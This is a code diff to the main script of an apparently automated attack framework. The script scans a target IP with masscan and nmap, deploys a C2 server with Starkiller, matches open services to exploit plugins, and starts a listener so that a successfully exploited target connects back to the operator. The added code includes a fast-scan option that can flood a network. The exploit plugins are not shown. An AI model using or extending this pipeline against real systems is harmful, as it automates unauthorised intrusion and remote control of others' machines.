@@ -6,6 +6,7 @@ from multiprocessing import Process
 import sys
 import configparser
 import os
+import sys
 from utils import *
 from plugins.initial_access import *
 import constants
@@ -92,6 +93,7 @@ def main() -> None | str:
     parser.add_argument('-lp', '--local_port', default=9001, type=int, help='local port', required=False)
     parser.add_argument('-rp', '--remote_port', type=int, required=False)
     parser.add_argument('-o', '--output', type=str, help='output report file name (.md format)', required=False)
+    parser.add_argument('-f', '--fast-scan', action='store_true', help='increase masscan\'s rate limit to 100000, be careful with this option it might flood the network', required=False)
     args = parser.parse_args()
 
 
@@ -103,35 +105,49 @@ def main() -> None | str:
     # validate IP addresses' format
     validate_ip_address(args.target_ip)
     validate_ip_address(LOCAL_IP)
+    
+    if args.remote_port:
+        res_recon = recon.nmap_scan({args.target_ip:[args.remote_port]})
+    else:
+        res_masscan = recon.masscan_scan(args.target_ip, args.fast_scan)
+        no_ports_open = True
+        for target, ports in res_masscan.items():
+            if len(ports) > 0:
+                no_ports_open = False
+                break
+        if no_ports_open:
+            sys.exit('[-] Error: No open ports found by masscan')
+        res_recon = recon.nmap_scan(res_masscan)
 
-        # deploy c2 and start client
+    # deploy c2 and start client
     c2_infos = c2.c2(LOCAL_IP)
     c2.starkiller()
-
-    res_recon = recon.nmap_scan(args.target_ip, args.remote_port)
 
     BUFFER_SIZE = 1024 * 128
     SEPARATOR = '<sep>'
     
-    for i in res_recon:
-        print('[+] Looking for exploits for port {}'.format(i['port']))
-        exploit_available = False
-        for plugin_name, values in configs.items():
-            if ((safe_get(i, 'product') and safe_get(i, 'product') == safe_get(values, 'service')) and (safe_get(i,'version') and safe_get(i, 'version') in safe_get(values, 'versions'))) \
-            or (safe_get(i,'extrainfo') and safe_get(i, 'extrainfo') == safe_get(values, 'extrainfo')) \
-            or (safe_get(i, 'http_title') and safe_get(values, 'http_title') and safe_get(values, 'http_title') in safe_get(i, 'http_title')):
-                exploit_available = True
-                target_port = i['port']
-                exploit_process = Process(target=run_initial_access_plugin, args = (plugin_name, values, args.target_ip, target_port, LOCAL_IP, args.local_port, args.output, c2_infos[1]))
-                exploit_process.start()
-                exploit_process.join()
-        if not exploit_available:
-            print('[-] No exploit available for this port')
-    if args.output :
-        print("[+] Report available in {}".format(args.output))
-    else : 
-        print("[-] No output file provided for a report, --output <filename.md> allows to create a report")
-
+    for target in res_recon:
+        for i in target:
+            print('[+] Looking for exploits for port {}'.format(i['port']))
+            exploit_available = False
+            for plugin_name, values in configs.items():
+                if ((safe_get(i, 'product') and safe_get(i, 'product') == safe_get(values, 'service')) and (safe_get(i,'version') and safe_get(i, 'version') in safe_get(values, 'versions'))) \
+                or (safe_get(i,'extrainfo') and safe_get(i, 'extrainfo') == safe_get(values, 'extrainfo')) \
+                or (safe_get(i, 'http_title') and safe_get(values, 'http_title') and safe_get(values, 'http_title') in safe_get(i, 'http_title')):
+                    exploit_available = True
+                    target_port = i['port']
+                    listener_process = Process(target=listener, args = (args.local_port, LOCAL_IP, args.output))
+                    listener_process.start()
+                    exploit_process = Process(target=run_initial_access_plugin, args = (plugin_name, values, args.target_ip, target_port, LOCAL_IP, args.local_port, args.output, c2_infos[1]))
+                    exploit_process.start()
+                    listener_process.join()
+                    exploit_process.join()
+            if not exploit_available:
+                print('[-] No exploit available for this port')
+        if args.output :
+            print("[+] Report available in {}".format(args.output))
+        else : 
+            print("[-] No output file provided for a report, --output <filename.md> allows to create a report")
 
 if __name__ == '__main__':
     main()
